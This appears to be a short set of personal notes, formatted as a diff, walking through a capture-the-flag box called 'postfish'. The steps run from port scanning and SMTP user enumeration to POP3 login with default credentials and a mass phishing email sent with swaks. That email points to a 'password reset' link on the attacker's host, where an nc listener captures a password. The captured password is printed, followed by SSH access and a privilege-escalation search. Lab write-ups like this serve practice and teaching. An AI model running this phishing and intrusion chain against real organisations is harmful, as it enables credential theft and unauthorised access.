@@ -1,0 +1,38 @@
+rustscan -a IP --ulimit 5000
+cat << E0F > open-ports
+cat open-ports | cut -f1 -d '/' | tr '\n' ','
+nmap -p port -sC -sV
+
+create user.txt manually from postfish.off
+add position too
+
+smtp-user-enum
+got the info user exist
+
+telnet IP 25/110 OR nc -nv IP 25/110
+USER user -> sales
+PASS pass -> sales
+logged in.
+
+LIST
+RETR 1 (read message 1)
+MAIL FROM: it@postfish.off
+RCPT TO: brian.moore@postoff
+DATA
+Subject: Password Reset
+(your text)
+
+use swaks (smtp send mail tool)
+
+create email to manually, sales@postfish.off, etc
+
+swaks --to $(cat emails.txt | tr '\n' ',') --from it@postfish.off --header "Subject:password reset link" --body "Hey team, as discussed in our previous email, reset your passwords at http://kaliIP" --server targetIP
+
+kali machine: nc -lvnp  80
+got brian.moore password
+EternaLSunshinE
+
+try on ssh, got the shell
+
+check root executed package:
+find / -group filter 2>/dev/null
